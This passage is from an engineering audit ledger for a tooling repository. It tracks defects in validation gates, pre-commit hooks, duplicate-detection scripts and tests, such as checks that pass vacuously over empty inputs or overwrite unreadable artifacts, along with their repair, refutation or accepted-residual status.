| S109 | low | LEAD | a | `skills/public/release/scripts/publish_release_retro.py:133` | `build_retro_trigger_evaluation` called with an empty `release_content_paths` list (a publish whose content commit produced no changed paths, or a `--resume` path). `check_auto_tri | `persist_retro_trigger_closeout` returns `{"status": "skipped", "reason": "retro trigger did not match the evaluated release paths"}` — asserting a non-match over zero evaluated pa |
| S110 | medium | LEAD (opened 2026-07-31 by operator decision) | b | `scripts/validate_cautilus_proof.py:200` | An ALREADY-CHECKED-IN cautilus proof artifact that was validated against the prompt surfaces of an earlier commit, plus a later commit that changes one of those same prompt surfaces without touching the artifact. Every floor (`validate_prompt_surfaces`, `validate_behavior_source`, `validate_commands_run`, `validate_scenario_review`) runs only inside the `artifact_repo_path in changed_paths` branch. | Not run — reasoned from source. The predicted verdict is the S8-refuted exit-0 message, but the residual is a different claim from S8's: S8 was about a prompt change with NO artifact and was correctly refuted (deterministic validators own that case). This row is about an artifact that EXISTS and asserts coverage of a prompt surface that has since moved. The gate keys on 'was the artifact edited in this diff', which is coarse where currency is what matters, so the artifact's own `## Prompt Surfaces` list is never re-checked against the surfaces' current state. Reproduce before working it. |
| S111 | high | PARENT-CONFIRMED (observed live 2026-08-01) | f | `scripts/check_doc_links.py:24` | Any commit whose changed paths are entirely under `charness-artifacts/`. The pre-commit hook schedules `check-doc-links` for it and the gate walks `DOC_GLOBS` = README/AGENTS/docs/presets/profiles/skills — which excludes `charness-artifacts/` — with no path override. | Observed on this session's OWN first commit: the hook printed `RUN`, `PASS`, and `charness pre-commit: ok` for `check-doc-links` over a commit it could not see a single changed file of. Green over a denominator that is empty by construction. The same class A3 names at index granularity, here at glob granularity; the A3 critique fenced per-gate denominators out of that row, so this is its own. |
| S112 | medium | PARENT-CONFIRMED (observed live 2026-08-01) | d | `tests/test_usage_episodes_host_hooks.py:40` and every sibling that snapshots shared state | Two pytest runs over the same tree concurrently — a background full suite plus a second invocation. | 17 failures and 21 errors, none of them real: the shared-state snapshot tests saw each other's writes. A clean serial run of the identical tree is 6403 passed. This is sibling-scan Tier 2 D's flake class one level up: that row fenced the assertion against concurrent live WRITERS, and concurrent test RUNNERS are the same hazard from a different direction. A false red is cheaper than a false green, but it cost a full re-run to disprove. |
| S113 | low | LEAD (2026-08-01) | b | `scripts/boundary_probe_lib.py:123` vs `scripts/critique_enforcement_scope.py:340` | Any repo where the injected `adapter_lib` and the module-level `_critique_adapter_lib` could resolve differently. | `resolve_cross_surface_scope` reads the adapter handed to it to decide `not-configured`, while `resolve_hit` re-reads its own module-level adapter for the probe config — two adapter reads deciding one verdict. In this repo both resolve to the same module so they cannot disagree today, and the 2026-08-01 slice made the matched-path witness consume the read `resolve_hit` actually used. Recorded because a future injection point makes "configured" and "hit" separable. |
## 2026-07-31 closeout non-claims

- **S5 is closed at the author-time preflight only.** The same pressure-exempt
  walk exists twice more — `skills/public/quality/scripts/skill_ergonomics_lib.py`
  (skill-local-portable, so it cannot import the repo module) and
  `scripts/validate_quality_artifact.py`. Both keep the unbounded, unaudited,
  fence-blind version with a different exempt set, so the `quality` inventory's
  `core_nonempty_lines` and `long_core` still carry the hatch, and the two numbers
  diverge on any skill with a `## Closeout Vocabulary` block. Recorded in
  `docs/conventions/authoring-preflight.md`; queued as an operator decision.
- **S21's detection is a floor, not a detector.** Widening it caught the reported
  shapes and the ordinary request positions, but a phrase heuristic can still miss
  a decision request phrased another way, and a miss is a silent pass.
- **S22 repairs a checker with no caller.** `audit_brief.py` is not invoked by the
  `issue` workflow, so the repair fixes the checker's verdict, not an enforced
  boundary. It also gained its first test module in the same slice.
- Each closed row was reproduced by the parent first, repaired, and left with a
  regression test that fails when the fix is reverted (checked with
  `git apply -R`). No live cautilus run, no mutation lane, no CI dispatch.

## Reported clean

One lens set, one pass, one agent. A scope statement, not a verdict — these are
the surfaces a later cycle should re-examine under a DIFFERENT lens, not the
surfaces that are known good.

- `scripts/check_python_filenames.py`
- `skills/public/achieve/scripts/describe_goal_closeout_shape.py`
- `skills/public/achieve/scripts/upsert_goal.py`
- `skills/public/announcement/scripts/preflight_sources.py`
- `skills/public/announcement/scripts/record_announcement.py`
- `skills/public/critique/scripts/scaffold_critique_artifact.py`
- `skills/public/gather/scripts/gather_writer_lib.py`
- `skills/public/handoff/scripts/chunked_routing_auto_draft.py`
- `skills/public/handoff/scripts/chunked_routing_issue_backend.py`
- `skills/public/handoff/scripts/chunked_routing_parser.py`
- `skills/public/handoff/scripts/chunked_routing_staleness.py`
- `skills/public/handoff/scripts/chunked_routing_types.py`
- `skills/public/hitl/scripts/bootstrap_review.py`
- `skills/public/issue/scripts/issue_brief.py`
- `skills/public/issue/scripts/issue_close.py`
- `skills/public/issue/scripts/issue_validate_closeout_draft.py`
- `skills/public/quality/scripts/dup_ratchet_git.py`
- `skills/public/quality/scripts/inventory_cli_side_effect_probes.py`
- `skills/public/quality/scripts/nose_fingerprint_lib.py`
- `skills/public/quality/scripts/resolve_quality_artifact.py`
- `skills/public/release/scripts/plan_release_run.py`
- `skills/public/release/scripts/publish_release_rollback.py`
- `skills/public/release/scripts/release_issue_closeout.py`
- `skills/public/release/scripts/release_issue_closeout_message.py`
- `skills/public/retro/scripts/prepare_packet.py`

## Leads found while closing S27/S29/S33/S34

Two bounded review rounds over that one fix produced these. **Provenance:
REVIEWER-DERIVED** — read from source by a read-only reviewer, not reproduced by the
parent, except where a row says otherwise. The rows marked `REPAIRED (same slice)` were
fixed and regression-tested inside the S27/S29/S33/S34 commit. **No row here is open:**
R8 was refuted at HEAD on 2026-07-30 (the S25 fix had already closed it — see its row),
and R9 was dispositioned as an accepted residual by the operator on 2026-07-28.

| id | sev | status | surface:line | the unestablished verdict |
| --- | --- | --- | --- | --- |
| R1 | high | REPAIRED (same slice) | `skills/public/quality/scripts/migrate_dup_fingerprints.py` | A PRESENT but unreadable accepted artifact (truncated JSON, conflict markers, unknown schemaVersion) was coerced by `or set()` / `or {}` into "declares zero accepted", which skipped the vanish refusal and then OVERWROTE that artifact with an empty one. The gate degrades on this same condition; the tool that writes the file did not. |
| R2 | high | REPAIRED (same slice) | `skills/public/quality/scripts/migrate_dup_fingerprints.py` | The vanish guard SUMMED survivors across the gate baseline and advisory baseline, so one surface's total vanish hid behind the other's survivor; the dup-review overlay — the least reconstructible of the three — had no vanish guard at all. |
| R3 | high | REPAIRED (same slice) | `skills/public/quality/scripts/nose_report_lib.py` | `report_shape_error` waived the bare-array payload entirely and otherwise keyed on the self-declared `ranking.total_families`, which is absent on exactly the shapes it exists to catch (a `families` list of non-dict entries carries no `summary` block). Now keys on the RAW entry count. |
| R4 | high | REPAIRED (same slice) | `skills/public/quality/scripts/inventory_doc_duplicates.py:106` | `payload.get("markdown")` with `... if isinstance(families, list) else []`: a renamed/future key rendered `status: ok` with zero families, giving a clean doc advisory AND a vacuously clean dup-ratchet doc arm. The doc-side twin of S34, left open behind a dead `family_count` guard the first fix had added. |
| R5 | med | REPAIRED (same slice) | `skills/public/quality/scripts/dup_ratchet_scan.py` | The injected CODE inventory ignored the payload's self-reported `status` while the doc reader honored it, so a payload minted when nose was absent/erroring (`families: []` by construction) read as a declared-empty scan. |
| R6 | med | REPAIRED (same slice) | `skills/public/quality/scripts/seed_dup_review.py` | `_families_from_payload` was byte-for-byte the pre-fix `families_from_text`; `_run_inventory` read stdout and ignored the return code; `_load_existing` swallowed a corrupt overlay, so `--write` rebuilt it from scratch and dropped every operator classification while reporting success. |
| R7 | med | REPAIRED (same slice) | `skills/public/quality/scripts/dup_ratchet_rebaseline.py` | `--write-baseline` over a zero-family live scan wrote an EMPTY accepted baseline and reported `baseline-written`, which then disarms the gate's own zero-family backstop (keyed on a non-empty baseline). On first-time bootstrap the large-delta guard is skipped entirely. Reachable: nose exits 0 with `families: []` over a scope root matching no supported files (parent-probed 2026-07-28). |
| R8 | high | **REFUTED (2026-07-30)** | `skills/public/quality/scripts/changed_line_coverage_gate_lib.py:27` | A failed `git diff` (`returncode != 0`) returns `[]`, which the gate renders as "no eligible changed files in this range", `ok: True`. The canonical producer is a shallow CI fetch where `base_sha` is not present locally. The freshness fingerprint is vacuous in the same breath, so the staleness guard passes too. A BLOCKING gate, different subsystem — its own slice. **Refuted at HEAD on 2026-07-30, by execution:** driving `run_gate` with an unresolvable base sha returns `{ok: false, unestablished: true, reason: "could not establish the changed set: ... exited 128"}`, with a real base sha as the discriminating control. R8 (line 27) and the already-CLOSED S25 (line 145) are the SAME defect at two lines of one file, and the S25 fix (`_git_lines` raising `GitUnavailable`, the `unestablished` arm, the fingerprint-failure arm) closed both. Regression coverage predates this session. Not work to pick up. |
| R9 | med | **DISPOSITIONED (accepted residual 2026-07-28)** | `skills/public/quality/scripts/check_dup_ratchet.py:138` | The "0 families but the baseline has N" backstop is gated on `and baseline_ids`, so a present-but-EMPTY baseline disarms it, and there is no doc-arm equivalent. **Operator decision: accept the residual and close the write path instead of adding a detector.** `--write-baseline` now refuses an empty scan without an explicit confirmation (R7), so an empty baseline can no longer arrive silently; widening the backstop would make every genuinely clone-free adopting repo read as degraded on every run — a false refusal traded for an unactionable warning. A repo that ALREADY holds an empty baseline stays unguarded, which is the accepted cost and is documented in the degrade ladder of `skills/public/quality/references/dup-ratchet.md`. Not a defect to work; reopen only with evidence of an empty baseline arriving by a path R7 does not cover. |
| R10 | high | REPAIRED (round 2) | `skills/public/quality/scripts/draft_dup_ratchet_triage.py:146` | The new unevaluated-status guard omitted `degraded` — the canonical could-not-judge status, and the one every code-arm degrade this slice ADDED now produces (`{"status": "degraded", "new_code_families": [], "ok": true}`). The repair hardened the producer and then taught the consumer to trust exactly that output. A gate may treat a degrade as advisory; this drafter is a writer whose output drafts a permanent accept. |
| R11 | high | REPAIRED (round 2) | `skills/public/quality/scripts/migrate_dup_fingerprints.py:220` | The new per-surface vanish guard computed overlay survivors as `len(ids) - len(dropped_ids)`; `dropped_ids` is a per-ENTRY list that neither dedupes nor excludes id-less entries, so a duplicated or `id: null` overlay entry made the count NEGATIVE and `not -1` is False. The guard was disarmed by the shape it was written to catch. Parent-proved by injecting the old arithmetic and watching the new test fail. |
| R12 | med | REPAIRED (round 2) | `skills/public/quality/scripts/seed_dup_review.py:97` | The new overlay refusal caught only unparseable JSON, while its sibling written in the same round required a dict with an `entries` list. A list/scalar/renamed-key overlay still read as "no prior review" through a parse that succeeded, so `--write` wiped every classification. Two readers of one artifact must not disagree about what readable means. |
| R13 | med | REPAIRED (round 2) | `skills/public/quality/scripts/draft_dup_ratchet_triage.py:62` | `_unsampled_member_count` returned 0 for an ABSENT `members` field, so "the record does not say" was indistinguishable from "fully sampled" and the permissive branch won — the S27 shape again, and the opposite of how the sibling field `shared_lines` is treated three lines down in the same function. |
| R14 | med | REPAIRED (round 2) | `tests/test_doc_duplicates_inprocess_coverage.py:94` | A test-side instance: an assertion loosened from `== "boom"` to `"boom" in ...` to accommodate a longer message stopped discriminating, so the doc arm's empty-output naming was pinned by nothing and a revert would have stayed green. The same class in test form. |
